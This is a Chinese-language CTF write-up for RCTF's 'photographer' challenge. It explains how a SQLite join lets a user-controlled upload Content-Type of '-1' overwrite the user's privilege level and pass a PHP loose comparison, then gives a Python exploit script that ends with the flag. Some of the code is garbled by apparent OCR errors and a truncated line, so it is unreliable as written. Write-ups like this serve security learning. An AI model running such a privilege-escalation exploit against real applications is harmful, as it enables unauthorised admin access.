---
tags: [SQLite连表冲突, 列名覆盖, PHP弱类型比较, 文件上传, 逻辑漏洞]
---

# photographer

flag 在  public/superadmin .php

```
if  (Auth 八check()  绥  Auth 八type()  <  $user_types[ 'admin ' ])  {
echo  getenv('FLAG ')  ? :   'RCTF{test_flag} ' ; }
```

$user_types[ 'admin ' ]  是 0， 所以需要让  Auth 八type()  小于 0。

Auth 八type()  取自 session 里的 user 信息 ， 而用户信息是在 User 八findById 里查出来的：

```
public  static  function  findById($userId)  {
return  DB 八table('user ')
→leftJoin( 'photo ' ,  'user .background_photo_id ' ,   '= ' ,   'photo .id ')
→where( 'user .id ' ,   '= ' ,  $userId)
→first(); }
```

这里用了leftJoin连表查询photo。但是user表和photo表都有 type。其中 user .type 是权限等级， photo .type 是文件的 MIME

framework/DB.php 这里可以看到使用SQLite 的fetchArray并且模式为SQLITE3_ASSOC， 也就是返回以列名索引的数组

```
while  ($row  =  $result→fetchArray(SQLITE3_ASSOC))  {
$rows []  =  $row; }
```

所以后面的type将覆盖前面的， 也就是  photo .type 会覆盖掉  user .type上传图片时， Photo 八create 用的type 是直接$_FILES里拿的：

```
$file  =  [
'type '  →  $files [ 'type ' ] [$i] ,
Ⅱ   …
] ;
```

type可控

所以思路就是， 注册登录， 上传个图片 ， 抓包把  Content-Type 改成  -1  ， 并设置为背景。 此时 user .type 就变成了字符串  "-1 "  ， PHP 弱类型比较  "-1 " < 0  成立

```
import  requests
import  re

BASE_URL  =   '<http:Ⅱ1.95.160.41 :26002>'
EMAIL  =   'xxx@xxx .com '
PASSWORD  =   '123456 '

s  =  requests .Session()

r  =  s .get(f '{BASE_URL}/register ')
csrf_token  =  re .search(r 'name= "csrf_token "  value= "([a-f0-9]+ ) " ' ,


s .post(f '{BASE_URL}/api/register ' ,  data={
'username ' :   'hacker ' ,
'email ' :  EMAIL ,
'password ' :  PASSWORD ,
'confirm_password ' :  PASSWORD ,
'csrf_token ' :  csrf_token
})

#  随便一张图片
img_content  =
b '\\x89PNG\\r\\n\\x1a\\n\\x00\\x00\\x00\\rIHDR\\x00\\x00\\x00\\x01\\x00\\x00\\ x00\\x01\\x08\\x06\\x00\\x00\\x00\\x1f\\x15\\xc4\\x89\\x00\\x00\\x00\\nIDATx\\ x9cc\\x00\\x01\\x00\\x00\\x05\\x00\\x01\\r\\n -
\\xb4\\x00\\x00\\x00\\x00IEND\\xaeB、\\x82 '

#  Content-Type  设置为  -1
files  =  {
'photos [] ' :  ( '1 .png ' ,  img_content ,   ' -1 ')
}
r  =  s .post(f '{BASE_URL}/api/photos/upload ' ,  files=files)
photo_id  =  r .json () [ 'photos ' ] [0 ] [ 'id ' ]

r  =  s .get(f '{BASE_URL}/settings ')
csrf_token  =  re .search(r 'name= "csrf_token "  value= "([a-f0-9]+ ) " ' ,
r .text) .group(1 )

s .post(f '{BASE_URL}/api/user/background ' ,  data={
'photo_id ' :  photo_id ,
'csrf_token ' :  csrf_token
})

r  =  s .get(f '{BASE_URL}/superadmin .php ')
print(r .text)
RCTF{h4rd__70__54y_wh37h3r__175_4_bu6_0r_4_f347ur3}
```

